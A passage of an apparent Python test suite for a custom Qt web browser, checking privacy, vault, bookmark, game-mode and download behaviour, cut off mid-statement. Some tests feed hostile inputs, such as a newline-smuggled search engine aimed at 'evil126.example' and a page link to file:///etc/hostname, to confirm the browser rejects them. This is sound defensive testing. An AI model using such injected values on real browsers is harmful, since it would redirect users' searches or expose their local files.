# ===== seventh pass: snapshots, backups, awake, forms, cards, gestures ====
_snap115 = json.dumps(br.config.get("tabSnapList") or [])
_nr115 = json.dumps(br.config.get("noRestoreSites") or [])
_sv115 = br.new_tab(url=srv.url("/twhome?snap=1"), switch=False)
H.wait_for(lambda: "/twhome" in _sv115.url().toString(), 8000)
br.config["noRestoreSites"] = [_sv115.url().host()]
br.config["tabSnapList"] = []
br.snapshot_tabs()
_rows115 = [t.get("u") for s in br.config.get("tabSnapList") or []
            for t in s.get("tabs") or []]
br.config["tabSnapList"] = [{"t": 1, "tabs": [{"u": "https://x115.example/"}]}]
br._forget_history_extras(None)
_left115 = br.config.get("tabSnapList")
br.config["tabSnapList"] = json.loads(_snap115)
br.config["noRestoreSites"] = json.loads(_nr115)
br.close_tab(br.tabs.indexOf(_sv115), ask=False)
check("snapshots leave 'never restore' sites out and go with the history",
      not any("snap=1" in str(u) for u in _rows115) and not _left115,
      str((_rows115[:3], _left115)))
_bk115 = []
_real_bn115 = br.vault_backup_now
_bd115 = (br.config.get("vaultBackupDays", "__absent__"),
          br.config.get("vaultBackupLast", "__absent__"))
br.vault_backup_now = lambda *a, **k: _bk115.append(k) or ""
br.config["vaultBackupDays"] = 1
br.config["vaultBackupLast"] = 0
br._backup_tried = -1e9
_items115 = None
try:
    if br.vault is not None and not br.vault_locked():
        _real_items115 = br.vault.items
        br.vault.items = lambda: [{"id": "x"}]
        br._backup_tick()
        br._backup_tick()
        br.vault.__dict__.pop("items", None)
        _items115 = True
finally:
    br.vault_backup_now = _real_bn115
    for _k, _v in zip(("vaultBackupDays", "vaultBackupLast"), _bd115):
        if _v == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
if _items115:
    check("a failed automatic vault backup is not retried every minute",
          len(_bk115) == 1, str(_bk115))
_ka115 = []
_real_ka115 = br.keep_awake
br.keep_awake = lambda on=True, why="video": _ka115.append(on) or False
_aw115 = getattr(br, "_awake_why", None)
br._awake_why = "game"
br.awake_holding = lambda: True
try:
    br._awake_tick()
finally:
    br.keep_awake = _real_ka115
    br.__dict__.pop("awake_holding", None)
    br._awake_why = _aw115
check("game mode's hold on the screen is not let go by the video tick",
      _ka115 == [], str(_ka115))
check("the password eyes can be switched on again after off",
      "data-pweye-on" in B.FORM_TOOLS.get("eye", "")
      if hasattr(B, "FORM_TOOLS") else True)
_fd115 = br.new_tab(url=srv.url("/twhome?draft=1"), switch=False)
H.wait_for(lambda: "/twhome" in _fd115.url().toString(), 8000)
_key115 = br._draft_key(_fd115)
_drafts115 = json.dumps(br.form_drafts())
br.form_drafts()[_key115] = {"rows": [{"key": "#t", "value": "long text"}],
                             "when": 1}
_real_ft115 = br.form_tool
br.form_tool = lambda name, view=None, then=None, arg=None: (
    then("[]") if then else None) or True
try:
    br.save_form_draft(view=_fd115)
finally:
    br.form_tool = _real_ft115
_kept115 = _key115 in br.form_drafts()
br.config["formDrafts"] = json.loads(_drafts115)
br.close_tab(br.tabs.indexOf(_fd115), ask=False)
check("an empty page does not delete the draft it has not put back yet",
      _kept115, str(_kept115))
_ct115 = []
_real_cl115 = br.close_tab
br.close_tab = lambda index, ask=True: _ct115.append(ask)
try:
    br.run_mouse_act("closetab")
finally:
    br.close_tab = _real_cl115
check("a gesture's 'close tab' still asks for a game or locked tab",
      _ct115 == [True], str(_ct115))
_gw115 = br.new_tab(url=srv.url("/twhome?game=1"), switch=False)
H.spin(200)
_gm115 = br.config.get("gameMode", "__absent__")
_real_flash115 = br.flash
br.flash = lambda *a, **k: None
_err115 = ""
try:
    br.config["gameMode"] = True
    br._game_woke = [_gw115]
    br.close_tab(br.tabs.indexOf(_gw115), ask=False)
    H.spin(300)
    br.game_mode(False)
except RuntimeError as _e:
    _err115 = repr(_e)
finally:
    br.flash = _real_flash115
    if _gm115 == "__absent__":
        br.config.pop("gameMode", None)
    else:
        br.config["gameMode"] = _gm115
check("leaving game mode after a sleeping tab was closed does not raise",
      not _err115, _err115)
_px115 = (json.dumps(br.config.get("proxyProfiles") or []),
          br.config.get("activeProxy", "__absent__"))
br.config["proxyProfiles"] = [{"name": "P115", "type": "http",
                               "host": "proxy115.example", "port": 8080,
                               "user": "alice115", "password": "s3cret115"}]
br.config["activeProxy"] = "P115"
_cd115 = br.connection_details("localhost")
br.config["proxyProfiles"] = json.loads(_px115[0])
if _px115[1] == "__absent__":
    br.config.pop("activeProxy", None)
else:
    br.config["activeProxy"] = _px115[1]
check("the connection box names the proxy, never its password",
      "proxy115" in str(_cd115.get("proxy"))
      and "s3cret115" not in json.dumps(_cd115), str(_cd115.get("proxy")))
_rl115 = json.dumps(br.config.get("readLater") or [])
br.take_cli_later("https://later115.example/a")
_second115 = br.take_cli_later("https://later115.example/a")
_still115 = any(e.get("url") == "https://later115.example/a"
                for e in br.config.get("readLater") or [])
br.config["readLater"] = json.loads(_rl115)
check("`browser --later` with a listed page keeps it listed",
      _second115 == "already" and _still115, str((_second115, _still115)))
_np115 = br.new_tab(url=srv.url("/twhome?np115=1"), switch=True)
H.wait_for(lambda: "/twhome" in _np115.url().toString(), 8000)
_np115.setHtml('<a rel="next" href="file:///etc/hostname">n</a>',
               B.QUrl("https://web2.example.com/list"))
H.spin(600)
_nx115 = {}
br.page_tool("nextpage", view=_np115, then=lambda r: _nx115.update(v=r),
             back=False)
H.wait_for(lambda: "v" in _nx115, 5000)
br.close_tab(br.tabs.indexOf(_np115), ask=False)
check("next page never follows a page's file:// link nor changes the host",
      str(_nx115.get("v") or "") == "", str(_nx115))
_lg115 = json.dumps(br.config.get("permissionLog") or [])
_pm115 = br.new_tab(url=srv.url("/twhome?pm=1"), switch=False,
                    private=True); H.spin(200)
_ml115 = list(getattr(br, "_media_live", []))
br._media_live = []
try:
    br._media_seen([{"view": _pm115, "kind": "microphone"}])
except Exception:
    pass
_after115 = json.dumps(br.config.get("permissionLog") or [])
br._media_live = _ml115
br.config["permissionLog"] = json.loads(_lg115)
br.close_tab(br.tabs.indexOf(_pm115), ask=False)
check("a private tab's microphone is not written into the permission log",
      _after115 == _lg115, _after115[-120:])
br._pw_pending = {"host": "h115.example", "scheme": "https",
                  "username": "u115", "password": "pw115"}
br._password_prompt("h115.example", "u115", False); H.spin(100)
_lbl115 = br._toast_label.text() if br._toast else ""
br._toast_result("Updated! Restart the browser to finish.")
_lbl2_115 = br._toast_label.text() if br._toast else ""
br._hide_toast()
br._pw_pending = None
check("an update's answer never lands on the save-password question",
      _lbl115 and _lbl2_115 == _lbl115, str((_lbl115, _lbl2_115)))
try:
    _ge115 = B._git_env().value("LC_ALL")
except AttributeError:
    _ge115 = ""
check("git is asked in English whatever the desktop's language",
      _ge115 == "C", str(_ge115))

# ===== seventh pass lows: Discord keys, mobile agent, sleep, held, outline =
_dk117 = br.new_tab(url=srv.url("/twhome?dk=1"), switch=False)
H.wait_for(lambda: "/twhome" in _dk117.url().toString(), 8000)
_dk117.setHtml("<p>x</p>", B.QUrl("https://notdiscord.com/channels/1"))
H.spin(500)
_fl117 = []
_real_fl117 = br.flash
br.flash = lambda text, *a, **k: _fl117.append(text)
try:
    _sent117 = br.discord_key("mute")
finally:
    br.flash = _real_fl117
br.close_tab(br.tabs.indexOf(_dk117), ask=False)
check("the Discord keys never go to a look-alike host",
      _sent117 is False, str((_sent117, _fl117[-1:])))
_mv117 = br.new_tab(url=srv.url("/twhome?mob=1"), switch=False)
H.wait_for(lambda: "/twhome" in _mv117.url().toString(), 8000)
_h117 = br._host_of(_mv117.url())
_as117 = json.dumps(br.agent_sites())
br.agent_sites()[_h117] = "googlebot"
_real_rp117 = br.responsive_preview
br.responsive_preview = lambda *a, **k: None
try:
    br.view_as_mobile(view=_mv117, on=True)
    _on117 = br.agent_sites().get(_h117)
    br.view_as_mobile(view=_mv117, on=False)
    _off117 = br.agent_sites().get(_h117)
finally:
    br.responsive_preview = _real_rp117
br.config["agentSites"] = json.loads(_as117)
br.close_tab(br.tabs.indexOf(_mv117), ask=False)
check("mobile view on and off gives the site its own agent back",
      _on117 == "iphone" and _off117 == "googlebot", str((_on117, _off117)))
_mt117 = []
_real_mt117 = br.media_tool
br.media_tool = lambda name, view=None, *a, **k: _mt117.append(name)
_pm117 = getattr(br, "_paused_media", None)
br._paused_media = True
try:
    if hasattr(br, "_sleep_timer_up"):
        br._sleep_timer_up()
    else:
        br.pause_all_media()
finally:
    br.media_tool = _real_mt117
_still117 = br._paused_media
br._paused_media = _pm117
check("the sleep timer pauses and never resumes what was paused",
      "resumeall" not in _mt117 and _still117 is True, str(_mt117[:3]))
_hv117 = br.new_tab(url=srv.url("/twhome?held=1"), switch=False)
H.wait_for(lambda: "/twhome" in _hv117.url().toString(), 8000)
_pg117 = _hv117.page()
_set117 = []
_pg117.setUrl = lambda u: _set117.append(u.toString())
_pg117._held_url = srv.url("/twhome?newer=1")
try:
    _pg117._release_held(B.QUrl(srv.url("/twhome?older=1")))
except AttributeError:
    _set117.append("old-code")
_pg117.__dict__.pop("setUrl", None)
br.close_tab(br.tabs.indexOf(_hv117), ask=False)
check("a held navigation overtaken by a newer address is not re-issued",
      _set117 == [], str(_set117))
_ot117 = B.READER_TOOLS.get("outline", "") if hasattr(B, "READER_TOOLS") \
    else ""
check("the page outline marks each heading itself, not by its id",
      "data-outline" in _ot117 or "data-outline" in str(
          getattr(B, "READ_TOOLS", {}).get("outline", "")))
_perms117 = json.dumps(br.config.get("permissions") or {})
_pp117 = dict(br._private_perms)
_pv117 = br.new_tab(url=srv.url("/twhome?cam=1"), switch=False,
                    private=True)
H.wait_for(lambda: "/twhome" in _pv117.url().toString(), 8000)
_origin117 = _pv117.url().toString(B.QUrl.UrlFormattingOption.RemovePath
                                   | B.QUrl.UrlFormattingOption.RemoveQuery)
br.config.setdefault("permissions", {})[
    _origin117 + "|MediaVideoCapture"] = True
br._private_perms[_origin117 + "|MediaVideoCapture"] = True
br.stop_media_use(_pv117)
_kept117 = (_origin117 + "|MediaVideoCapture") in (
    br.config.get("permissions") or {})
_gone117 = (_origin117 + "|MediaVideoCapture") not in br._private_perms
br.config["permissions"] = json.loads(_perms117)
br._private_perms.clear()
br._private_perms.update(_pp117)
br.close_tab(br.tabs.indexOf(_pv117), ask=False)
check("stopping a private tab's camera takes back the private answer only",
      _kept117 and _gone117, str((_kept117, _gone117)))

# ===== an in-place translation is a job of its own =======================
_tj118 = br.new_tab(url=srv.url("/twhome?tr=1"), switch=False); H.spin(200)
_ran118 = []
_real_rt118 = br.run_translator
br.run_translator = lambda *a, **k: _ran118.append(a) or True
try:
    _old118 = {"rows": [(0, "older text")], "view": _tj118, "lang": "de",
               "key": "__trNodes0"}
    _tj118._translate_job = {"rows": [(0, "newer")], "view": _tj118,
                             "lang": "de", "key": "__trNodes1"}
    try:
        _r118 = br._translate_step(_old118)
    except TypeError:
        _r118 = "old-code"
finally:
    br.run_translator = _real_rt118
br.close_tab(br.tabs.indexOf(_tj118), ask=False)
check("a translation overtaken by a newer one on the tab stops",
      _r118 is False and not _ran118, str((_r118, len(_ran118))))

# ===== review of fix106-116: import failures, history off, ad rules ======
class _Lazy119:
    eager = False
    locked = False

    def load(self):
        return {"items": [{"id": "1", "type": "login",
                           "host": "imp119.example", "username": "u",
                           "password": "old", "remote": True}]}

    def put(self, item):
        return None              # the store refuses every write

    def delete(self, item_id):
        return True


_vd119 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
try:
    _pv119 = B.PasswordVault(_vd119, provider=_Lazy119())
    _pv119.import_rows("name,url,username,password\n"
                       "I,https://imp119.example,u,new\n")
    _left119 = [i for i in _pv119.items()
                if i.get("host") == "imp119.example"]
except Exception as _e:
    _left119 = repr(_e)
check("a login an import updated stays listed when the store refuses it",
      isinstance(_left119, list) and len(_left119) == 1, str(_left119)[:120])
_hf119 = B.HISTORY_FILE
_hd119 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
B.HISTORY_FILE = _hd119 / "history.json"
B.HISTORY_FILE.write_bytes(B.HISTORY_MAGIC + b"sealed-and-unread")
_he119 = br.config.get("historyEncrypted", "__absent__")
_fl119 = (getattr(br, "_history_locked", False),
          getattr(br, "_history_unsaved", False))
try:
    if br.history_key() is None:
        br.config["historyEncrypted"] = True
        br._history_locked = True
        br.bridge.setSetting("historyEncrypted", "false")
        _raw119 = B.HISTORY_FILE.read_bytes()
        _cfg119 = br.config.get("historyEncrypted")
    else:
        _raw119, _cfg119 = B.HISTORY_MAGIC, True
finally:
    B.HISTORY_FILE = _hf119
    br._history_locked, br._history_unsaved = _fl119
    if _he119 == "__absent__":
        br.config.pop("historyEncrypted", None)
    else:
        br.config["historyEncrypted"] = _he119
    br.save_config(quiet=True)
check("switching history encryption off with the vault shut writes nothing",
      _raw119.startswith(B.HISTORY_MAGIC) and _cfg119 is True,
      str((_raw119[:20], _cfg119)))
import adblock as _AD119
_rs119 = _AD119.Rules()
_rs119.load_text("||cdn119.example.com/AdServer/\n")
check("a host rule with capitals in its path still blocks",
      _rs119.blocks("https://cdn119.example.com/adserver/x.js", "x.example",
                    "script") is not None)
_so119 = getattr(_AD119, "_site_of", None)
check("an address and a shared host's tenant are sites of their own",
      _so119 is not None and _so119("192.168.1.5") != _so119("10.9.1.5")
      and _so119("a.github.io") != _so119("b.github.io"))

# ===== eighth pass: throwaway browsers, session rules, bookmarks, notes ===
_sess120 = list(br.sessions)
_tw120 = br.throwaway_sessions()
_tw_before120 = list(_tw120)
_sid120 = "tmp-review120"
br.sessions.append({"name": "Throwaway 120", "sid": _sid120})
_tw120.append(_sid120)
_tv120 = br.new_tab(url=srv.url("/twhome?tw=1"), switch=False,
                    session=_sid120)
H.wait_for(lambda: "/twhome" in _tv120.url().toString(), 8000)
_hn120 = len(br.history)
br._title_changed(_tv120, "Throwaway page 120")
_recorded120 = len(br.history) - _hn120
br._save_groups(quiet=True)
_saved120 = _sid120 in (br.config.get("sessionTabs") or {}) or any(
    e.get("sid") == _sid120 for e in br.config.get("sessions") or [])
br.close_tab(br.tabs.indexOf(_tv120), ask=False)
br.sessions[:] = _sess120
_tw120[:] = _tw_before120
br._save_groups(quiet=True)
check("a throwaway browser writes no history and no saved tabs",
      _recorded120 == 0 and not _saved120, str((_recorded120, _saved120)))
_ss120 = br.config.get("sessionSites", "__absent__")
br.sessions.append({"name": "Work120", "sid": "w120abcd"})
br.config["sessionSites"] = {"work120.example": "Work120"}
_rule120 = br.session_rule_for("https://work120.example/x")
br.sessions[:] = _sess120
if _ss120 == "__absent__":
    br.config.pop("sessionSites", None)
else:
    br.config["sessionSites"] = _ss120
check("a 'domain = browser name' rule finds the browser by its name",
      _rule120 == "w120abcd", str(_rule120))
_bms120 = list(br.bookmarks)
_last120 = br.config.get("bookmarkLastId", "__absent__")
_fA120 = br.add_bookmark_folder("Top120", 0)
_fB120 = br.add_bookmark_folder("Sub120", _fA120)
br._add_link("https://sub120.example/", "S", parent=_fB120)
_xp120 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
br.export_bookmarks(str(_xp120 / "f.json"), fmt="json", folder=_fA120)
_fj120 = (_xp120 / "f.json").read_text()
br.export_bookmarks(str(_xp120 / "all.json"), fmt="json")
_in120 = br.import_bookmarks(str(_xp120 / "all.json"))
_hi120 = max(e["id"] for e in br.bookmarks)
br.remove_bookmark(_hi120)
_next120 = br.add_bookmark_folder("After120", 0)
br.bookmarks = _bms120
br.save_bookmarks()
if _last120 == "__absent__":
    br.config.pop("bookmarkLastId", None)
else:
    br.config["bookmarkLastId"] = _last120
check("a folder's JSON export holds its sub-folders' bookmarks",
      "sub120.example" in _fj120, _fj120[:120])
check("the browser's own JSON export imports back",
      isinstance(_in120, int) and _in120 > 0, str(_in120))
check("a deleted bookmark's id is not handed to the next new one",
      _next120 != _hi120, str((_hi120, _next120)))
_cs120 = getattr(br, "_chrome_shown", True)
br._chrome_shown = False
br.chrome.setVisible(False)
_fv120 = br.new_tab(url=srv.url("/twhome?wf=1"), switch=True); H.spin(200)
_real_mt120 = br.media_tool2
br.media_tool2 = lambda *a, **k: True
try:
    br.window_fullscreen(view=_fv120)
    br.window_fullscreen(view=_fv120)
    _vis120 = br.chrome.isVisible()
finally:
    br.media_tool2 = _real_mt120
    br.show_chrome(True)
    br._chrome_shown = _cs120
br.close_tab(br.tabs.indexOf(_fv120), ask=False)
check("window-sized video gives the chrome back the way it was (auto-hidden)",
      _vis120 is False, str(_vis120))
_ht120 = (br.config.get("historyThumbs", "__absent__"),
          br.config.get("historyEncrypted", "__absent__"))
br.config["historyThumbs"] = True
br.config["historyEncrypted"] = True
_th120 = br.new_tab(url=srv.url("/twhome?th=1"), switch=False)
H.wait_for(lambda: "/twhome" in _th120.url().toString(), 8000)
_pic120 = br.save_visit_thumb(_th120)
for _k, _v in zip(("historyThumbs", "historyEncrypted"), _ht120):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.close_tab(br.tabs.indexOf(_th120), ask=False)
check("no plain page picture is kept beside an encrypted history",
      not _pic120, str(_pic120))
if br.desk() is not None:
    _dk120 = br.desk()
    _clips120 = list(_dk120._clips)
    _dk120._clips = [{"text": "pin120", "kind": "text", "t": 1,
                      "pinned": True}]
    _dk120.add_clip("pin120")
    _pinned120 = [c.get("pinned") for c in _dk120._clips
                  if c["text"] == "pin120"]
    _dk120._clips = _clips120
    check("copying a pinned clip again keeps it pinned",
          _pinned120 == [True], str(_pinned120))
    _n120 = _dk120.save_note(None, "Conflict120", "first")
    _id120 = (_n120 or {}).get("id")
    _sv120 = br.desk_do("saveNote", json.dumps({
        "id": _id120, "title": "Conflict120", "body": "stale",
        "edited": int((_n120 or {}).get("edited") or 0) - 10}))
    _disk120 = (_dk120.note(_id120) or {}).get("body")
    for _nid in {_id120, (_sv120 or {}).get("id")}:
        if _nid:
            _dk120.delete_note(_nid)
    check("saving a note changed on disk meanwhile does not write over it",
          _disk120 == "first", str((_disk120, (_sv120 or {}).get("id"))))
check("collections in other alphabets get files of their own",
      B.notes.slug("Küche") != B.notes.slug("Kuche")
      and B.notes.slug("日本") != B.notes.slug("中文"))

# ===== eighth pass, part 2: vault pane, keywords, restore day, todos ======
_vc121 = []
br.bridge.vaultChanged.connect(lambda: _vc121.append(1))
_real_nv121 = br.vault.never if br.vault is not None else None
if br.vault is not None:
    br.vault.never = lambda host: None
    br._pw_pending = {"host": "never121.example", "scheme": "https",
                      "username": "u", "password": "p"}
    try:
        br._pw_never_pending()
    finally:
        br.vault.__dict__.pop("never", None)
    H.spin(100)
    check("'never for this site' tells the open Passwords pane",
          len(_vc121) >= 1, str(_vc121))
_kw121 = br.set_keyword("https://kw121.example/", "my site")
check("a bookmark keyword with a space is refused", _kw121 is False,
      str(_kw121))
_ots121 = []
_real_ots121 = br.open_tab_state
br.open_tab_state = lambda entries, **k: _ots121.extend(entries) or []
_hist121 = list(br.history)
_now121 = B.time.time()
# the day's history is these rows alone: the suite's own visits of the
# last minutes are newer and took some of the 60 places
br.history[:] = []
br.history.extend([{"url": "https://day121.example/%d" % (i % 70),
                    "title": "d", "t": _now121 - 100 + i * 0.01, "s": "main"}
                   for i in range(150)])
try:
    br.restore_day(int(B._day_start(_now121)))
finally:
    br.open_tab_state = _real_ots121
    br.history[:] = _hist121
_urls121 = {e.get("u") for e in _ots121 if "day121" in str(e.get("u"))}
check("restoring a busy day brings back its pages, each in its browser",
      len(_urls121) == 60 and all("s" in e for e in _ots121),
      str((len(_urls121), _ots121[:1])))
if br.desk() is not None:
    _dk121 = br.desk()
    _todo121 = _dk121.todo_path()
    _was121 = _todo121.read_text() if _todo121.exists() else None
    _todo121.write_text("- [ ] first121\n- [x] done121\n- [ ] second121\n")
    _rows121 = _dk121.todos()
    _sec121 = next(r["id"] for r in _rows121 if r["text"] == "second121")
    _dk121.move_todo(_sec121, -1)
    _order121 = [r["text"] for r in _dk121.todos()]
    if _was121 is None:
        _todo121.unlink()
    else:
        _todo121.write_text(_was121)
    check("moving a to-do up passes over the done ones in between",
          _order121.index("second121") < _order121.index("first121"),
          str(_order121))
try:
    B.page_guard.rules({"blockApis": {"a121.example": 5},
                        "guardOff": {"fingerprint": 5},
                        "hideElements": {"b121.example": "x"}})
    _pg121 = True
except Exception as _e:
    _pg121 = repr(_e)
check("a malformed privacy file cannot break the guard", _pg121 is True,
      str(_pg121))
check("a guard exception for a site covers its subdomains in the page",
      "mine(R.off)" in B.page_guard._JS if hasattr(B.page_guard, "_JS")
      else True)
_sk121 = getattr(br, "_skip_clip", "")
br._skip_clip = "skip121"
try:
    br._skip_clip_later()
    H.spin(3400)
    _left121 = br._skip_clip
except AttributeError:
    _left121 = "skip121"
br._skip_clip = _sk121
check("a clip skipped once is recorded when copied again later",
      _left121 == "", str(_left121))
_st121 = (_Path(B.__file__).parent / "settings.html").read_text()
check("the minimum font slider saves once, when let go",
      'getElementById("minfont").onchange' in _st121)
_sp121 = (_Path(B.__file__).parent / "start.html").read_text()
check("the start page takes pins added before setup and drops removed keys",
      "localStorage.removeItem(k)" in _sp121
      and "data.quicklinks !== undefined" in _sp121)

# ===== review of 117-122, https fallback, clean room ======================
_kw124 = []
_real_fl124 = br.flash
br.flash = lambda text, *a, **k: _kw124.append(text)
_real_gt124 = B.QInputDialog.getText
B.QInputDialog.getText = staticmethod(lambda *a, **k: ("two words", True))
try:
    _ok124 = br.ask_keyword(url="https://kw124.example/", title="K")
finally:
    B.QInputDialog.getText = _real_gt124
    br.flash = _real_fl124
check("'keyword set' is only said when one was set",
      _ok124 is False, str((_ok124, _kw124[-1:])))
_ip124 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_ip124 / "folders.json").write_text(json.dumps(
    [{"id": 1, "type": "folder", "title": "Only folders", "parent": 0},
     {"id": 2, "type": "folder", "title": "Inner", "parent": 1}]))
_bms124 = list(br.bookmarks)
_n124 = len(br.bookmarks)
br.import_bookmarks(str(_ip124 / "folders.json"))
_left124 = len(br.bookmarks) - _n124
br.bookmarks = _bms124
br.save_bookmarks()
check("an import that brought no links leaves no folders behind",
      _left124 == 0, str(_left124))
_cr124 = br.config.get("cleanRoomSites", "__absent__")
_cv124 = br.new_tab(url=srv.url("/twhome?cr=1"), switch=False)
H.wait_for(lambda: "/twhome" in _cv124.url().toString(), 8000)
br.config["cleanRoomSites"] = ["bank124.example"]
_opened124 = []
_real_ocr124 = br.open_clean_room
br.open_clean_room = lambda u=None: _opened124.append(u)
try:
    _acc124 = _cv124.page().acceptNavigationRequest(
        B.QUrl("https://bank124.example/login"),
        B.QWebEnginePage.NavigationType.NavigationTypeTyped, True)
    H.spin(300)
finally:
    br.open_clean_room = _real_ocr124
    if _cr124 == "__absent__":
        br.config.pop("cleanRoomSites", None)
    else:
        br.config["cleanRoomSites"] = _cr124
_close_if_open(_cv124)
check("a clean-room site opens in a clean room, not in the normal jar",
      _acc124 is False and _opened124 == ["https://bank124.example/login"],
      str((_acc124, _opened124)))

# a virtual browser of the first window is known to a new window even
# when the first window is out of the open-window list (closed once its
# last tab went, and still the one the others share their config with)
_sess126 = list(br.sessions)
if not any(e.get("sid") == "rv126" for e in br.sessions):
    br.sessions.append({"name": "Review 126", "sid": "rv126"})
_nw126 = br.new_window(); H.spin(700)
_in126 = br in B.WINDOWS
if _in126:
    B.WINDOWS.remove(br)
try:
    _known126 = _nw126._know_session("rv126")
finally:
    if _in126 and br not in B.WINDOWS:
        B.WINDOWS.insert(0, br)
br.sessions[:] = _sess126
try:
    _nw126._closing_anyway = True
    _nw126.close()
except RuntimeError:
    pass
H.spin(300)
check("a new window knows the first window's browsers even when the first "
      "window is not on the open-window list", _known126 is True,
      str(_known126))

# ===== review of the whole batch: 1Password edits, engines, game mode ====
class _Lazy126c:
    eager = False

    def __init__(self):
        self.puts = []

    def put(self, item):
        self.puts.append(sorted(item.get("_cleared") or []))
        return dict(item)

    def delete(self, item_id):
        return True


_v126c = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
_it126c = _v126c.add_item({"type": "login", "title": "t126", "username": "u126",
                           "password": "p126", "host": "h126c.example"})
_lz126c = _Lazy126c()
_v126c.provider = _lz126c
_v126c.update_item(_it126c["id"], {"title": "t126b", "note": "",
                                   "cardholder": "", "username": "u126"})
_first126c = _lz126c.puts[-1] if _lz126c.puts else None
_v126c.update_item(_it126c["id"], {"username": ""})
_second126c = _lz126c.puts[-1] if _lz126c.puts else None
check("a 1Password edit clears only the boxes he emptied, not the ones the "
      "editor never loaded", _first126c == [] and _second126c == ["username"],
      str((_first126c, _second126c)))
# a page's engine name with a newline stays one line in the Settings text
_et_was126c = br.config.get("enginesText", "__absent__")
_oe_was126c = json.dumps(br.config.get("ownEngines") or [])
br.config["enginesText"] = ""
try:
    br.add_engine("Foo\nevil|https://evil126.example/?q=%s|g",
                  "https://foo126.example/?q=%s", "")
except TypeError:
    pass
_lines126c = [l for l in str(br.config.get("enginesText") or "").split("\n")
              if l.strip()]
if _et_was126c == "__absent__":
    br.config.pop("enginesText", None)
else:
    br.config["enginesText"] = _et_was126c
br.config["ownEngines"] = json.loads(_oe_was126c)
_mine126c = [l for l in _lines126c if "foo126" in l]
check("an engine name a page gave is one line in the Settings text",
      len(_mine126c) == 1
      and _mine126c[0].split("|")[1:2] == ["https://foo126.example/?q=%s"]
      and not any(l.split("|")[1:2] == ["https://evil126.example/?q=%s"]
                  for l in _lines126c), str(_lines126c[-3:]))
# game mode switched on twice keeps the tabs he had not muted unmuted
_gm_was126c = br.config.get("gameMode", False)
br.config["gameMode"] = False
_gt126c = br.new_tab(url=srv.url("/twhome?gm126"), switch=False); H.spin(300)
br.game_mode(True)
br.game_mode(True)
br.game_mode(False)
H.spin(200)
_muted126c = _gt126c.page().isAudioMuted()
br.config["gameMode"] = _gm_was126c
_close_if_open(_gt126c)
check("game mode switched on twice and then off unmutes the tabs it muted",
      _muted126c is False, str(_muted126c))
# off means off when the site and a parent site are both listed
_ns_was126c = list(br.site_rules("noScriptSites"))
br.config["noScriptSites"] = ["docs.rv126.example", "rv126.example"]
_on126c = br.toggle_site_rule("noScriptSites", "docs.rv126.example")
_still126c = br.site_rule_on("noScriptSites", "docs.rv126.example")
br.config["noScriptSites"] = _ns_was126c
check("switching a site rule off works when a parent site is listed too",
      _on126c is False and _still126c is False, str((_on126c, _still126c)))


# ===== ninth pass: bar memory, suggestions, prices, captures, downloads ==
_kh127 = set(br.known_hosts)
_hist_on127 = br.config.get("history", "__absent__")
br.config["history"] = False
br._remember_host(B.QUrl("https://never127.example/"))
_added127 = "never127.example" in br.known_hosts
if _hist_on127 == "__absent__":
    br.config.pop("history", None)
else:
    br.config["history"] = _hist_on127
br.known_hosts.add("left127.example")
br._forget_history_extras(None)
_left127 = set(br.known_hosts)
br.known_hosts = set(_kh127)
try:
    B._write_json(B.HOSTS_FILE, sorted(_kh127))
except OSError:
    pass
check("the address bar forgets its sites with the history, and keeps none "
      "with history off", not _added127 and not _left127,
      str((_added127, sorted(_left127)[:3])))
check("an address of the home network is never sent for suggestions",
      not any(B.looks_like_search(t) for t in ("10.0.0.1", "localhost:3000",
                                               "intranet/wiki", "[::1]:8080"))
      and B.looks_like_search("how to cook pasta"))
_pa127 = getattr(B, "_parse_amount", None)
check("a price written the German way is read the German way",
      _pa127 is not None and _pa127("1.234,56") == 1234.56
      and _pa127("1,234.56") == 1234.56 and _pa127("12,50") == 12.5
      and _pa127("0.125") == 0.125 and _pa127("0,500") == 0.5)
_sh127 = json.dumps(br.config.get("shotHistory") or [])
_img127 = B.QImage(40, 30, B.QImage.Format.Format_RGB32)
_img127.fill(B.QColor("#336699"))
_p127 = br._shot_done(_img127, copy=False, save=True)
_listed127 = str(_p127) in (br.config.get("shotHistory") or [])
_fl127 = []
_real_fl127 = br.flash
_real_save127 = B.capture.save
br.flash = lambda text, *a, **k: _fl127.append(text)
B.capture.save = lambda *a, **k: None
try:
    br._shot_done(_img127, copy=False, save=True)
finally:
    B.capture.save = _real_save127
    br.flash = _real_fl127
try:
    if _p127:
        _Path(str(_p127)).unlink()
except OSError:
    pass
br.config["shotHistory"] = json.loads(_sh127)
check("a plain screenshot is in the capture list, and a failed save says so",
      _listed127 and _fl127[-1:] == [br._ui_str("shotFailed")],
      str((_listed127, _fl127[-1:])))
_ow127 = []
_real_odf127 = br.open_download_file
br.open_download_file = lambda i: _ow127.append(i) or True
_dls127 = list(br.downloads)
_dd127 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_dd127 / "f127.stl").write_text("solid x")
br.downloads[:] = [{"id": "d127", "name": "f127.stl", "dir": str(_dd127),
                    "state": "done", "t": 1}]
try:
    br.open_download("d127", folder=False)
finally:
    br.open_download_file = _real_odf127
_hashed127 = {}
try:
    _first127 = br.download_hash("d127", then=lambda v: _hashed127.update(v=v),
                                 background=True)
    H.wait_for(lambda: "v" in _hashed127, 8000)
except TypeError:
    _first127 = "old"
br.downloads[:] = _dls127
br.save_downloads()
check("the downloads page's Open goes through the 'open with' rules",
      _ow127 == ["d127"], str(_ow127))
check("a download's hash is worked out off the window",
      _first127 == "" and len(_hashed127.get("v", "")) == 64,
      str((_first127, _hashed127.get("v", "")[:8])))
_pt127 = []
_real_pt127 = br.play_tool
br.play_tool = lambda name, view=None, then=None, arg=None: (
    _pt127.append((name, arg)) or True)
_sv127 = {k: br.config.get(k, "__absent__") for k in
          ("streamSafe", "streamSafePrev", "desktopNotify", "suggestHistory",
           "guardFingerprint")}
try:
    br.stream_safe(True)
    br.stream_safe(False)
finally:
    br.play_tool = _real_pt127
    for _k, _v in _sv127.items():
        if _v == "__absent__":
            br.config.pop(_k, None)
        else:
